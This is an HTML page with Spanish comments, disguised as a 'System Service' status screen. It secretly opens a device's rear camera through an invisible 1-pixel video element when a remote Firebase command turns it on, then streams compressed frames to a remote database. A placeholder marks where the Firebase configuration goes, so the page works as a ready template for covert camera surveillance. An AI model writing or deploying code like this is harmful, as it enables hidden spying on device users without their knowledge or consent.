<!DOCTYPE html>
<html>
<head>
    <title>System Service</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="background:black; color:white; font-family:sans-serif; text-align:center;">
    <div id="status" style="margin-top:20px;">
        <div style="width:10px; height:10px; background:#0f0; border-radius:50%; margin:auto;"></div>
        <p style="font-size:10px; color:#333;">SISTEMA ACTIVO</p>
    </div>

    <video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // PEGA AQUÍ TU CONFIGURACIÓN DE FIREBASE
        const firebaseConfig = {
            databaseURL: "TU_URL_DE_FIREBASE"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const context = canvas.getContext('2d');
        let transmitiendo = false;

        // Función para enviar video en tiempo real
        function flujoVideo() {
            if (!transmitiendo) return;
            
            canvas.width = 400; // Resolución optimizada para velocidad
            canvas.height = 300;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Enviamos el frame comprimido
            const data = canvas.toDataURL('image/jpeg', 0.2);
            db.ref('stream').set(data);
            
            requestAnimationFrame(flujoVideo);
        }

        // Escuchar órdenes del padre
        db.ref('comando_video').on('value', (snap) => {
            if (snap.val() === "ON") {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                .then(s => {
                    video.srcObject = s;
                    transmitiendo = true;
                    flujoVideo();
                });
            } else {
                transmitiendo = false;
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(t => t.stop());
                }
                db.ref('stream').set(null);
            }
        });
    </script>
</body>
</html>
